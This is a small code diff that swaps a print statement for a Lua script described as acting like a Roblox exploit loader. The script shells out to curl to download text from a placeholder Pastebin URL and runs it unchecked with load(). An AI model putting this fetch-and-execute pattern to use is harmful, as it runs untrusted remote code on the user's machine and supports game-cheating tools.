@@ -1,1 +1,13 @@
-print('helloe')
+-- This acts exactly like a Roblox exploit loader
+local pastebinURL = "https://pastebin.com/raw/XXXXXX"
+
+-- We simulate HttpGet using a quick terminal trick for testing
+local handle = io.popen("curl -s " .. pastebinURL)
+local scriptContent = handle:read("*a")
+handle:close()
+
+if scriptContent and scriptContent ~= "" then
+    assert(load(scriptContent))()
+else
+    print("Failed to download script from Pastebin.")
+end
